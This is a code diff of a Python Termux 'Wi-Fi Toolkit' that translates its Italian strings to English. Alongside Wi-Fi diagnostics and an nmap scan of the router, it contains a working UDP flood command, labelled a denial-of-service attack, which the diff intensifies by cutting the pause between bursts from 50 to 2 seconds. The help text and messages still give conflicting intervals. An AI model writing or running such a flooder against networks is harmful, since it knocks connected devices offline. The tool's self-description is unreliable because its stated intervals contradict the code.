@@ -7,178 +7,189 @@ import time
 import os
 import sys
 
-# --- Funzioni di Utilità e Colori ---
+# --- Utility and Color Functions ---
 
 def run_command(command):
-    """Esegue un comando di sistema e restituisce l'output."""
+    """Executes a system command and returns its output."""
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True, encoding='utf-8')
         return result.stdout.strip()
     except subprocess.CalledProcessError as e:
-        return f"Errore: {e.stderr.strip()}"
+        return f"Error: {e.stderr.strip()}"
     except FileNotFoundError:
-        return f"Errore: Comando '{command.split()[0]}' non trovato."
+        return f"Error: Command '{command.split()[0]}' not found."
 
 def get_gateway_ip():
-    """Trova l'IP del gateway (router) in Termux."""
+    """
+    Finds the gateway (router) IP in Termux using multiple methods for reliability.
+    """
+    # Method 1: Try getprop (more direct and reliable on Android)
+    output = run_command("getprop dhcp.wlan0.gateway")
+    if output and re.match(r"\d+\.\d+\.\d+\.\d+", output):
+        return output.strip()
+
+    # Method 2: Fallback to parsing 'ip route' (standard Linux method)
     output = run_command("ip route")
     match = re.search(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
-    return match.group(1) if match else None
+    if match:
+        return match.group(1)
+
+    return None # Return None if both methods fail
 
 def print_header(title):
-    """Stampa un'intestazione colorata."""
+    """Prints a colored header."""
     print(f"\n\033[1;34m--- {title.upper()} ---\033[0m")
 
 def print_label_value(label, value, color="\033[1;32m"):
-    """Stampa una coppia etichetta-valore."""
+    """Prints a label-value pair."""
     print(f"{label:<25}: {color}{value}\033[0m")
 
-# --- Funzioni Principali del Toolkit ---
+# --- Main Toolkit Functions ---
 
 def show_wifi_info():
-    """Mostra un'analisi completa e dettagliata della connessione Wi-Fi."""
-    print_header("Analisi Connessione Wi-Fi")
+    """Shows a complete and detailed analysis of the Wi-Fi connection."""
+    print_header("Wi-Fi Connection Analysis")
 
-    # 1. Informazioni Base da Termux API
-    print("\033[1;36m[+] Informazioni Base dall'API di Android\033[0m")
+    # 1. Basic Info from Termux API
+    print("\033[1;36m[+] Basic Information from Android API\033[0m")
     wifi_info_json = run_command("termux-wifi-connectioninfo")
-    if "Errore" not in wifi_info_json and wifi_info_json:
+    if "Error" not in wifi_info_json and wifi_info_json:
         try:
             data = json.loads(wifi_info_json)
-            rssi = data.get("rssi", "N/D")
-            # Conversione approssimativa RSSI in Qualità (%)
+            rssi = data.get("rssi", "N/A")
+            # Approximate RSSI to Quality (%) conversion
             if isinstance(rssi, int):
                 if rssi > -50:
-                    quality = "Eccellente"
+                    quality = "Excellent"
                 elif rssi > -70:
-                    quality = "Buona"
+                    quality = "Good"
                 elif rssi > -80:
-                    quality = "Sufficiente"
+                    quality = "Fair"
                 else:
-                    quality = "Scarsa"
+                    quality = "Poor"
                 quality_str = f"{quality} ({rssi} dBm)"
             else:
-                quality_str = "N/D"
+                quality_str = "N/A"
 
-            print_label_value("SSID", data.get("ssid", "N/D"))
-            print_label_value("BSSID (MAC AP)", data.get("bssid", "N/D"))
-            print_label_value("Qualità Segnale", quality_str)
-            print_label_value("Velocità Link", f"{data.get('link_speed_mbps', 'N/D')} Mbps")
-            print_label_value("Frequenza", f"{data.get('frequency_mhz', 'N/D')} MHz")
-            print_label_value("IP Locale", data.get("ip", "N/D"))
-            print_label_value("IP Pubblico", run_command("curl -s ifconfig.me"))
-            print_label_value("Soppressione Rete", data.get("supplicant_state", "N/D"))
+            print_label_value("SSID", data.get("ssid", "N/A"))
+            print_label_value("BSSID (AP MAC)", data.get("bssid", "N/A"))
+            print_label_value("Signal Quality", quality_str)
+            print_label_value("Link Speed", f"{data.get('link_speed_mbps', 'N/A')} Mbps")
+            print_label_value("Frequency", f"{data.get('frequency_mhz', 'N/A')} MHz")
+            print_label_value("Local IP", data.get("ip", "N/A"))
+            print_label_value("Public IP", run_command("curl -s ifconfig.me"))
+            print_label_value("Supplicant State", data.get("supplicant_state", "N/A"))
         except json.JSONDecodeError:
-            print_label_value("Errore", "Impossibile analizzare l'output di termux-api.")
+            print_label_value("Error", "Could not parse termux-api output.")
     else:
-        print("Impossibile ottenere info Wi-Fi. Assicurati che termux-api sia installato e funzionante.")
+        print("Could not get Wi-Fi info. Ensure termux-api is installed and working.")
 
-    # 2. Informazioni di Rete (Gateway, DNS)
-    print("\n\033[1;36m[+] Dettagli di Rete\033[0m")
+    # 2. Network Details (Gateway, DNS)
+    print("\n\033[1;36m[+] Network Details\033[0m")
     gateway_ip = get_gateway_ip()
     if gateway_ip:
         print_label_value("Gateway (Router)", gateway_ip)
-        # Ping al gateway per latenza locale
+        # Ping the gateway for local latency
         ping_output = run_command(f"ping -c 3 {gateway_ip}")
         latency_match = re.search(r'min/avg/max/mdev = [\d.]+/([\d.]+)/', ping_output)
-        latency = f"{latency_match.group(1)} ms" if latency_match else "N/D"
-        print_label_value("Latenza (vs Gateway)", latency)
+        latency = f"{latency_match.group(1)} ms" if latency_match else "N/A"
+        print_label_value("Latency (to Gateway)", latency)
     else:
-        print_label_value("Gateway (Router)", "Non trovato")
+        print_label_value("Gateway (Router)", "Not found")
 
     dns1 = run_command("getprop net.dns1")
     dns2 = run_command("getprop net.dns2")
-    print_label_value("Server DNS 1", dns1)
-    print_label_value("Server DNS 2", dns2)
+    print_label_value("DNS Server 1", dns1)
+    print_label_value("DNS Server 2", dns2)
 
-    # 3. Scansione Avanzata del Gateway con Nmap
+    # 3. Advanced Gateway Scan with Nmap
     if gateway_ip:
-        print("\n\033[1;36m[+] Scansione Avanzata del Gateway (potrebbe richiedere tempo)\033[0m")
-        print(f"Esecuzione di 'nmap -F {gateway_ip}'...")
+        print("\n\033[1;36m[+] Advanced Gateway Scan (may take a moment)\033[0m")
+        print(f"Running 'nmap -F {gateway_ip}'...")
         nmap_output = run_command(f"nmap -F {gateway_ip}")
         print("\033[0;33m" + nmap_output + "\033[0m")
 
 
 def start_packet_flood(amount_str):
     """
-    Invia una raffica di pacchetti UDP al gateway per testare la stabilità della rete.
+    Sends a burst of UDP packets to the gateway to test network stability.
     """
-    print_header("Stress Test Wi-Fi (Attacco DoS)")
-    print("\033[1;31m*** ATTENZIONE: STAI PER INIZIARE UN ATTACCO DENIAL OF SERVICE ***\033[0m")
-    print("\033[1;33mUsalo solo sulla tua rete. Potrebbe disconnettere tutti i dispositivi.\033[0m")
+    print_header("Wi-Fi Stress Test (DoS Attack)")
+    print("\033[1;31m*** WARNING: YOU ARE ABOUT TO INITIATE A DENIAL OF SERVICE ATTACK ***\033[0m")
+    print("\033[1;33mUse this only on your own network. It may disconnect all connected devices.\033[0m")
     
-    confirm = input("Sei assolutamente sicuro di voler procedere? (sì/no): ").lower()
-    if confirm != 'sì':
-        print("Operazione annullata.")
+    confirm = input("Are you sure you want to proceed? (y/n): ")
+    if confirm.lower() != 'y':
+        print("Operation cancelled.")
         return
 
     try:
         amount = int(amount_str)
     except ValueError:
-        print("\033[1;31mErrore: La quantità deve essere un numero intero.\033[0m")
+        print("\033[1;31mError: Amount must be an integer.\033[0m")
         return
 
     gateway_ip = get_gateway_ip()
     if not gateway_ip:
-        print("\033[1;31mErrore: Impossibile trovare l'IP del gateway. Impossibile continuare.\033[0m")
+        print("\033[1;31mError: Could not find gateway IP. Aborting.\033[0m")
         return
 
     print(f"\nTarget: Gateway ({gateway_ip})")
-    print(f"Modalità: {amount} pacchetti UDP ogni 50 secondi.")
-    print("\033[1;36mPremi Ctrl+C per interrompere il ciclo di attacco.\033[0m")
-    time.sleep(3)
+    print(f"Mode: {amount} UDP packets every 3 seconds.")
+    print("\033[1;36mPress Ctrl+C to stop the attack cycle.\033[0m")
+    time.sleep(2)
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # 1024 bytes di dati casuali
+        # 1024 bytes of random data
         payload = random.randbytes(1024) 
         
         cycle = 1
         while True:
-            print(f"\n--- Ciclo #{cycle} ---")
-            print(f"Invio di {amount} pacchetti a {gateway_ip}...")
+            print(f"\n--- Cycle #{cycle} ---")
+            print(f"Sending {amount} packets to {gateway_ip}...")
             
             for i in range(amount):
-                # Scegli una porta casuale per ogni pacchetto per variare l'attacco
+                # Choose a random port for each packet to vary the attack
                 port = random.randint(1025, 65535)
                 s.sendto(payload, (gateway_ip, port))
-                # Stampa un progresso senza andare a capo
-                print(f"\rPacchetti inviati: {i+1}/{amount}", end="")
+                # Print progress without a newline
+                print(f"\rPackets sent: {i+1}/{amount}", end="")
             
-            print("\n\033[1;32mRaffica completata.\033[0m In attesa di 50 secondi...")
-            time.sleep(50)
+            print("\n\033[1;32mBurst complete.\033[0m Waiting for 2 seconds...")
+            time.sleep(2)
             cycle += 1
 
     except KeyboardInterrupt:
-        print("\n\n\033[1;31mAttacco interrotto dall'utente.\033[0m")
+        print("\n\n\033[1;31mAttack stopped by user.\033[0m")
     except Exception as e:
-        print(f"\n\n\033[1;31mSi è verificato un errore: {e}\033[0m")
+        print(f"\n\n\033[1;31mAn error occurred: {e}\033[0m")
     finally:
         s.close()
 
 
 def show_help():
-    """Mostra i comandi disponibili."""
-    print_header("Comandi Disponibili")
-    print("  \033[1;32minfo\033[0m          - Mostra un'analisi dettagliata della connessione Wi-Fi.")
-    print("  \033[1;32m/send <num>\033[0m   - Invia <num> pacchetti al router ogni 50 secondi (Stress Test).")
-    print("  \033[1;32mhelp\033[0m          - Mostra questo messaggio di aiuto.")
-    print("  \033[1;32mclear\033[0m         - Pulisce lo schermo.")
-    print("  \033[1;32mexit\033[0m          - Esce dal toolkit.")
+    """Shows available commands."""
+    print_header("Available Commands")
+    print("  \033[1;32minfo\033[0m          - Show a detailed analysis of the Wi-Fi connection.")
+    print("  \033[1;32m/send <num>\033[0m   - Send <num> packets to the router every 50s (Stress Test).")
+    print("  \033[1;32mhelp\033[0m          - Show this help message.")
+    print("  \033[1;32mclear\033[0m         - Clear the screen.")
+    print("  \033[1;32mexit\033[0m          - Exit the toolkit.")
 
 def main():
-    """Ciclo principale del toolkit."""
-    # Controlla dipendenze
+    """Main loop for the toolkit."""
+    # Check dependencies
     if "not found" in run_command("termux-wifi-connectioninfo --version"):
-        print("\033[1;31mErrore: 'termux-api' non sembra installato o funzionante.\033[0m")
-        print("Esegui 'pkg install termux-api' e riprova.")
+        print("\033[1;31mError: 'termux-api' does not seem to be installed or working.\033[0m")
+        print("Run 'pkg install termux-api' and install the Termux:API app.")
         sys.exit(1)
 
     os.system("clear")
     print("\033[1;34m=====================================\033[0m")
-    print("\033[1;36m    Python Wi-Fi Toolkit per Termux\033[0m")
+    print("\033[1;36m    Python Wi-Fi Toolkit for Termux by huawetto\033[0m")
     print("\033[1;34m=====================================\033[0m")
-    print("Digita 'help' per la lista dei comandi.")
+    print("Type 'help' for a list of commands.")
 
     while True:
         try:
@@ -195,22 +206,22 @@ def main():
                 if len(parts) > 1:
                     start_packet_flood(parts[1])
                 else:
-                    print("\033[1;31mUso: /send <numero_pacchetti>\033[0m")
+                    print("\033[1;31mUsage: /send <number_of_packets>\033[0m")
             elif command == "help":
                 show_help()
             elif command == "clear":
                 os.system("clear")
             elif command == "exit":
-                print("Uscita in corso...")
+                print("Exiting...")
                 break
             else:
-                print(f"\033[1;31mComando '{command}' non riconosciuto. Digita 'help'.\033[0m")
+                print(f"\033[1;31mCommand '{command}' not recognized. Type 'help'.\033[0m")
 
         except KeyboardInterrupt:
-            print("\nUscita in corso... (Ctrl+C rilevato)")
+            print("\nExiting... (Ctrl+C detected)")
             break
         except Exception as e:
-            print(f"\n\033[1;31mSi è verificato un errore imprevisto: {e}\033[0m")
+            print(f"\n\033[1;31mAn unexpected error occurred: {e}\033[0m")
 
 
 if __name__ == "__main__":
